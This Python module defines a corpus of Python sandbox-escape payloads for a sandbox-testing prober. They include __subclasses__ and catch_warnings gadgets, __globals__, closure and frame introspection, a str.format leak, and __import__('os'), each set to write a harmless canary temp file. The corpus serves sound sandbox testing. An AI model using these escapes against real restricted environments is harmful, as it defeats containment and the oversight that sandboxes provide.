"""Attributed corpus of sandbox-escape payloads.

Every payload is a small Python snippet seeded from the public technique
catalogs referenced in the task (jailctf/pyjailbreaker and
moshekaplan/python_sandbox_escapes). Each is *attributed* to the technique class
it represents and templated with a single ``{canary}`` placeholder: the dynamic
prober substitutes a throwaway temp-file path, and a successful escape writes to
that file. Nothing here touches a real system path.

``effect`` records what a successful run would do:

* ``"canary_write"`` — reaches real filesystem I/O (``open``/``os``) and writes
  the canary. The default canary oracle detects these.
* ``"disclosure"`` — a pure information-leak primitive (e.g. ``str.format``
  attribute walking) that cannot by itself perform I/O. The canary oracle
  correctly reports "no filesystem escape" for these; that is expected and is
  discussed in the README, not a bug.
"""

from __future__ import annotations

from dataclasses import dataclass


@dataclass(frozen=True)
class Payload:
    """One attributed escape-attempt payload."""

    id: str
    technique: str
    effect: str  # "canary_write" | "disclosure"
    description: str
    code_template: str

    def render(self, canary_path: str) -> str:
        """Return runnable code with the canary path substituted in.

        The canary path is injected as a Python string literal via ``repr`` so
        that Windows backslashes or spaces cannot break the snippet.
        """
        return self.code_template.replace("{canary}", repr(canary_path))


# NOTE: templates use "{canary}" (a bare token), substituted via str.replace so
# the snippets themselves can freely use normal str.format / f-strings.
_BUILTIN_PAYLOADS: tuple[Payload, ...] = (
    # ---- Technique 1: __subclasses__ traversal -------------------------------
    Payload(
        id="subclasses_init_globals",
        technique="subclasses_traversal",
        effect="canary_write",
        description=(
            "Walk object.__subclasses__(), find a class whose __init__.__globals__ "
            "exposes the module builtins, and pull open() from it."
        ),
        code_template=(
            "opener = None\n"
            "for c in ().__class__.__base__.__subclasses__():\n"
            "    g = getattr(getattr(c, '__init__', None), '__globals__', None)\n"
            "    if g and '__builtins__' in g:\n"
            "        b = g['__builtins__']\n"
            "        b = b if isinstance(b, dict) else b.__dict__\n"
            "        if 'open' in b:\n"
            "            opener = b['open']\n"
            "            break\n"
            "opener({canary}, 'w').write('escaped via __subclasses__')\n"
        ),
    ),
    Payload(
        id="subclasses_catch_warnings",
        technique="subclasses_traversal",
        effect="canary_write",
        description=(
            "Classic catch_warnings gadget: reach its ._module.__builtins__ and "
            "call open()."
        ),
        code_template=(
            "cw = [c for c in ().__class__.__base__.__subclasses__()\n"
            "      if c.__name__ == 'catch_warnings'][0]\n"
            "b = cw()._module.__builtins__\n"
            "b = b if isinstance(b, dict) else b.__dict__\n"
            "b['open']({canary}, 'w').write('escaped via catch_warnings')\n"
        ),
    ),
    # ---- Technique 2: __globals__ / __closure__ ------------------------------
    Payload(
        id="lambda_globals",
        technique="globals_closure_access",
        effect="canary_write",
        description="Read (lambda).__globals__ to reach module builtins and open().",
        code_template=(
            "g = (lambda: None).__globals__\n"
            "b = g['__builtins__']\n"
            "b = b if isinstance(b, dict) else b.__dict__\n"
            "b['open']({canary}, 'w').write('escaped via __globals__')\n"
        ),
    ),
    Payload(
        id="closure_cell_contents",
        technique="globals_closure_access",
        effect="canary_write",
        description=(
            "Capture builtins in a closure cell, then recover it via "
            "__closure__[0].cell_contents."
        ),
        code_template=(
            "def make():\n"
            "    x = __builtins__\n"
            "    def inner():\n"
            "        return x\n"
            "    return inner\n"
            "cell = make().__closure__[0].cell_contents\n"
            "b = cell if isinstance(cell, dict) else cell.__dict__\n"
            "b['open']({canary}, 'w').write('escaped via __closure__')\n"
        ),
    ),
    # ---- Technique 3: __builtins__ restoration -------------------------------
    Payload(
        id="builtins_direct",
        technique="builtins_restoration",
        effect="canary_write",
        description="Reference __builtins__ directly to recover open().",
        code_template=(
            "b = __builtins__\n"
            "b = b if isinstance(b, dict) else b.__dict__\n"
            "b['open']({canary}, 'w').write('escaped via __builtins__')\n"
        ),
    ),
    Payload(
        id="builtins_via_getattr",
        technique="builtins_restoration",
        effect="canary_write",
        description=(
            "Dynamic-attribute form: getattr(obj, '__class__') then climb to "
            "builtins (defeats naive name-based filters)."
        ),
        code_template=(
            "subs = getattr(getattr(object(), '__class__'), '__subclasses__')()\n"
            "opener = None\n"
            "for c in subs:\n"
            "    g = getattr(getattr(c, '__init__', None), '__globals__', None)\n"
            "    if g and '__builtins__' in g:\n"
            "        b = g['__builtins__']\n"
            "        b = b if isinstance(b, dict) else b.__dict__\n"
            "        if 'open' in b:\n"
            "            opener = b['open']; break\n"
            "opener({canary}, 'w').write('escaped via getattr chain')\n"
        ),
    ),
    # ---- Technique 4: frame / generator introspection ------------------------
    Payload(
        id="generator_gi_frame",
        technique="frame_generator_introspection",
        effect="canary_write",
        description="Read a generator's gi_frame.f_globals to reach builtins.",
        code_template=(
            "def g():\n"
            "    yield 1\n"
            "fr = g().gi_frame\n"
            "b = fr.f_globals['__builtins__']\n"
            "b = b if isinstance(b, dict) else b.__dict__\n"
            "b['open']({canary}, 'w').write('escaped via gi_frame')\n"
        ),
    ),
    Payload(
        id="traceback_frame",
        technique="frame_generator_introspection",
        effect="canary_write",
        description="Raise, then read __traceback__.tb_frame.f_globals for builtins.",
        code_template=(
            "try:\n"
            "    raise ValueError('x')\n"
            "except ValueError as e:\n"
            "    fr = e.__traceback__.tb_frame\n"
            "b = fr.f_globals['__builtins__']\n"
            "b = b if isinstance(b, dict) else b.__dict__\n"
            "b['open']({canary}, 'w').write('escaped via traceback')\n"
        ),
    ),
    # ---- Technique 5: str.format attribute access (disclosure) ---------------
    Payload(
        id="format_globals_leak",
        technique="format_string_attribute_access",
        effect="disclosure",
        description=(
            "Use str.format('{0.__globals__}') on a function to walk attributes "
            "via the C-level formatter (bypasses _getattr_). A disclosure "
            "primitive: it leaks the globals mapping but cannot itself call "
            "open(). A lambda is used because it actually has __globals__ "
            "(a wrapper_descriptor like object.__init__ does not)."
        ),
        code_template=(
            "leaked = '{0.__globals__}'.format(lambda: 0)\n"
            "result = str(leaked)[:64]\n"
        ),
    ),
    # ---- Technique 6: import access ------------------------------------------
    Payload(
        id="import_os_write",
        technique="import_access",
        effect="canary_write",
        description="import os and write the canary with low-level os file calls.",
        code_template=(
            "import os\n"
            "fd = os.open({canary}, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)\n"
            "os.write(fd, b'escaped via import os')\n"
            "os.close(fd)\n"
        ),
    ),
    Payload(
        id="dunder_import_os",
        technique="import_access",
        effect="canary_write",
        description="Call __import__('os') directly, then write the canary.",
        code_template=(
            "os = __import__('os')\n"
            "fd = os.open({canary}, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)\n"
            "os.write(fd, b'escaped via __import__')\n"
            "os.close(fd)\n"
        ),
    ),
)


def builtin_payloads() -> tuple[Payload, ...]:
    """Return the built-in attributed payload corpus."""
    return _BUILTIN_PAYLOADS
